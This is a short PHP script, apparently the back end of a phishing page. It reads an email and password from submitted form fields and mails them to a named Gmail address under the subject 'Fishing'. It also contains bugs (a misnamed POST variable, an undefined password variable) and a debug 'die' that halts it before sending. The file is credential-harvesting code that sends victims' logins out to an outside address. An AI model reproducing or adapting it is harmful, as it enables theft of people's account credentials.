<?php 



$mail = $POST['val'];
$pass = $POST['val1'];
// $to      = 'narekxachatryan1998@gmail.com';
// $subject = "Fishing";
// $message = "email: ".$mail.' | '."password: ".$pass;
// mail($to, $subject, $message);


print "ashxatuma"; die;

$to = 'narekxachatryan1998@gmail.com';
$subject = 'Fishing';
$message = $mail . ' | ' . $password;
// Sending email
if(mail($to, $subject, $message)){
    echo 'Your mail has been sent successfully.';
//     print $mail;
} else{
    echo 'Unable to send email. Please try again.';
}



